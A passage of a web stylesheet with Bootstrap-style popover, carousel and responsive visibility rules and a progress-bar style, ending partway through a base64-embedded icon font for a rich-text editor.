.popover.top > .arrow { bottom: -11px; left: 50%; margin-left: -11px; border-top-color: rgba(0, 0, 0, 0.25); border-bottom-width: 0px; }

.popover.top > .arrow::after { bottom: 1px; margin-left: -10px; content: " "; border-top-color: rgb(255, 255, 255); border-bottom-width: 0px; }

.popover.right > .arrow { top: 50%; left: -11px; margin-top: -11px; border-right-color: rgba(0, 0, 0, 0.25); border-left-width: 0px; }

.popover.right > .arrow::after { bottom: -10px; left: 1px; content: " "; border-right-color: rgb(255, 255, 255); border-left-width: 0px; }

.popover.bottom > .arrow { top: -11px; left: 50%; margin-left: -11px; border-top-width: 0px; border-bottom-color: rgba(0, 0, 0, 0.25); }

.popover.bottom > .arrow::after { top: 1px; margin-left: -10px; content: " "; border-top-width: 0px; border-bottom-color: rgb(255, 255, 255); }

.popover.left > .arrow { top: 50%; right: -11px; margin-top: -11px; border-right-width: 0px; border-left-color: rgba(0, 0, 0, 0.25); }

.popover.left > .arrow::after { right: 1px; bottom: -10px; content: " "; border-right-width: 0px; border-left-color: rgb(255, 255, 255); }

.carousel { position: relative; }

.carousel-inner { position: relative; width: 100%; overflow: hidden; }

.carousel-inner > .item { position: relative; display: none; transition: left 0.6s ease-in-out 0s; }

.carousel-inner > .item > img, .carousel-inner > .item > a > img { line-height: 1; }

.carousel-inner > .active, .carousel-inner > .next, .carousel-inner > .prev { display: block; }

.carousel-inner > .active { left: 0px; }

.carousel-inner > .next, .carousel-inner > .prev { position: absolute; top: 0px; width: 100%; }

.carousel-inner > .next { left: 100%; }

.carousel-inner > .prev { left: -100%; }

.carousel-inner > .next.left, .carousel-inner > .prev.right { left: 0px; }

.carousel-inner > .active.left { left: -100%; }

.carousel-inner > .active.right { left: 100%; }

.carousel-control { position: absolute; top: 0px; bottom: 0px; left: 0px; width: 15%; font-size: 20px; color: rgb(255, 255, 255); text-align: center; text-shadow: rgba(0, 0, 0, 0.6) 0px 1px 2px; opacity: 0.5; }

.carousel-control.left { background-image: linear-gradient(to right, rgba(0, 0, 0, 0.5) 0px, rgba(0, 0, 0, 0) 100%); background-repeat: repeat-x; }

.carousel-control.right { right: 0px; left: auto; background-image: linear-gradient(to right, rgba(0, 0, 0, 0) 0px, rgba(0, 0, 0, 0.5) 100%); background-repeat: repeat-x; }

.carousel-control:hover, .carousel-control:focus { color: rgb(255, 255, 255); text-decoration: none; outline: 0px; opacity: 0.9; }

.carousel-control .icon-prev, .carousel-control .icon-next, .carousel-control .glyphicon-chevron-left, .carousel-control .glyphicon-chevron-right { position: absolute; top: 50%; z-index: 5; display: inline-block; }

.carousel-control .icon-prev, .carousel-control .glyphicon-chevron-left { left: 50%; margin-left: -10px; }

.carousel-control .icon-next, .carousel-control .glyphicon-chevron-right { right: 50%; margin-right: -10px; }

.carousel-control .icon-prev, .carousel-control .icon-next { width: 20px; height: 20px; margin-top: -10px; font-family: serif; }

.carousel-control .icon-prev::before { content: "‹"; }

.carousel-control .icon-next::before { content: "›"; }

.carousel-indicators { position: absolute; bottom: 10px; left: 50%; z-index: 15; width: 60%; padding-left: 0px; margin-left: -30%; text-align: center; list-style: none; }

.carousel-indicators li { display: inline-block; width: 10px; height: 10px; margin: 1px; text-indent: -999px; cursor: pointer; background-color: rgba(0, 0, 0, 0); border: 1px solid rgb(255, 255, 255); border-radius: 10px; }

.carousel-indicators .active { width: 12px; height: 12px; margin: 0px; background-color: rgb(255, 255, 255); }

.carousel-caption { position: absolute; right: 15%; bottom: 20px; left: 15%; z-index: 10; padding-top: 20px; padding-bottom: 20px; color: rgb(255, 255, 255); text-align: center; text-shadow: rgba(0, 0, 0, 0.6) 0px 1px 2px; }

.carousel-caption .btn { text-shadow: none; }

@media screen and (min-width: 768px) {
  .carousel-control .glyphicon-chevron-left, .carousel-control .glyphicon-chevron-right, .carousel-control .icon-prev, .carousel-control .icon-next { width: 30px; height: 30px; margin-top: -15px; font-size: 30px; }
  .carousel-control .glyphicon-chevron-left, .carousel-control .icon-prev { margin-left: -15px; }
  .carousel-control .glyphicon-chevron-right, .carousel-control .icon-next { margin-right: -15px; }
  .carousel-caption { right: 20%; left: 20%; padding-bottom: 30px; }
  .carousel-indicators { bottom: 20px; }
}

.clearfix::before, .clearfix::after, .dl-horizontal dd::before, .dl-horizontal dd::after, .container::before, .container::after, .container-fluid::before, .container-fluid::after, .row::before, .row::after, .form-horizontal .form-group::before, .form-horizontal .form-group::after, .btn-toolbar::before, .btn-toolbar::after, .btn-group-vertical > .btn-group::before, .btn-group-vertical > .btn-group::after, .nav::before, .nav::after, .navbar::before, .navbar::after, .navbar-header::before, .navbar-header::after, .navbar-collapse::before, .navbar-collapse::after, .pager::before, .pager::after, .panel-body::before, .panel-body::after, .modal-footer::before, .modal-footer::after { display: table; content: " "; }

.clearfix::after, .dl-horizontal dd::after, .container::after, .container-fluid::after, .row::after, .form-horizontal .form-group::after, .btn-toolbar::after, .btn-group-vertical > .btn-group::after, .nav::after, .navbar::after, .navbar-header::after, .navbar-collapse::after, .pager::after, .panel-body::after, .modal-footer::after { clear: both; }

.center-block { display: block; margin-right: auto; margin-left: auto; }

.pull-right { float: right !important; }

.pull-left { float: left !important; }

.hide { display: none !important; }

.show { display: block !important; }

.invisible { visibility: hidden; }

.text-hide { font: 0px / 0 a; color: transparent; text-shadow: none; background-color: transparent; border: 0px; }

.hidden { display: none !important; visibility: hidden !important; }

.affix { position: fixed; transform: translate3d(0px, 0px, 0px); }

.visible-xs, .visible-sm, .visible-md, .visible-lg { display: none !important; }

.visible-xs-block, .visible-xs-inline, .visible-xs-inline-block, .visible-sm-block, .visible-sm-inline, .visible-sm-inline-block, .visible-md-block, .visible-md-inline, .visible-md-inline-block, .visible-lg-block, .visible-lg-inline, .visible-lg-inline-block { display: none !important; }

@media (max-width: 767px) {
  .visible-xs { display: block !important; }
  table.visible-xs { display: table; }
  tr.visible-xs { display: table-row !important; }
  th.visible-xs, td.visible-xs { display: table-cell !important; }
}

@media (max-width: 767px) {
  .visible-xs-block { display: block !important; }
}

@media (max-width: 767px) {
  .visible-xs-inline { display: inline !important; }
}

@media (max-width: 767px) {
  .visible-xs-inline-block { display: inline-block !important; }
}

@media (min-width: 768px) and (max-width: 991px) {
  .visible-sm { display: block !important; }
  table.visible-sm { display: table; }
  tr.visible-sm { display: table-row !important; }
  th.visible-sm, td.visible-sm { display: table-cell !important; }
}

@media (min-width: 768px) and (max-width: 991px) {
  .visible-sm-block { display: block !important; }
}

@media (min-width: 768px) and (max-width: 991px) {
  .visible-sm-inline { display: inline !important; }
}

@media (min-width: 768px) and (max-width: 991px) {
  .visible-sm-inline-block { display: inline-block !important; }
}

@media (min-width: 992px) and (max-width: 1199px) {
  .visible-md { display: block !important; }
  table.visible-md { display: table; }
  tr.visible-md { display: table-row !important; }
  th.visible-md, td.visible-md { display: table-cell !important; }
}

@media (min-width: 992px) and (max-width: 1199px) {
  .visible-md-block { display: block !important; }
}

@media (min-width: 992px) and (max-width: 1199px) {
  .visible-md-inline { display: inline !important; }
}

@media (min-width: 992px) and (max-width: 1199px) {
  .visible-md-inline-block { display: inline-block !important; }
}

@media (min-width: 1200px) {
  .visible-lg { display: block !important; }
  table.visible-lg { display: table; }
  tr.visible-lg { display: table-row !important; }
  th.visible-lg, td.visible-lg { display: table-cell !important; }
}

@media (min-width: 1200px) {
  .visible-lg-block { display: block !important; }
}

@media (min-width: 1200px) {
  .visible-lg-inline { display: inline !important; }
}

@media (min-width: 1200px) {
  .visible-lg-inline-block { display: inline-block !important; }
}

@media (max-width: 767px) {
  .hidden-xs { display: none !important; }
}

@media (min-width: 768px) and (max-width: 991px) {
  .hidden-sm { display: none !important; }
}

@media (min-width: 992px) and (max-width: 1199px) {
  .hidden-md { display: none !important; }
}

@media (min-width: 1200px) {
  .hidden-lg { display: none !important; }
}

.visible-print { display: none !important; }

@media print {
  .visible-print { display: block !important; }
  table.visible-print { display: table; }
  tr.visible-print { display: table-row !important; }
  th.visible-print, td.visible-print { display: table-cell !important; }
}

.visible-print-block { display: none !important; }

@media print {
  .visible-print-block { display: block !important; }
}

.visible-print-inline { display: none !important; }

@media print {
  .visible-print-inline { display: inline !important; }
}

.visible-print-inline-block { display: none !important; }

@media print {
  .visible-print-inline-block { display: inline-block !important; }
}

@media print {
  .hidden-print { display: none !important; }
}

.ngProgressLite { pointer-events: none; }

.ngProgressLiteBar { background: rgb(34, 153, 221); position: fixed; z-index: 99999; top: 0px; left: 0px; height: 2px; }

.ngProgressLite .ngProgressLiteBarShadow { display: block; position: absolute; right: 0px; width: 100px; height: 100%; box-shadow: rgb(34, 153, 221) 0px 0px 10px, rgb(34, 153, 221) 0px 0px 5px; opacity: 1; transform: rotate(3deg) translate(0px, -4px); }

@font-face { font-family: RedactorFont; src: url("data:application/x-font-ttf;charset=utf-8;base64,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") format("truetype"), url("data:application/font-woff;charset=utf-8;base64,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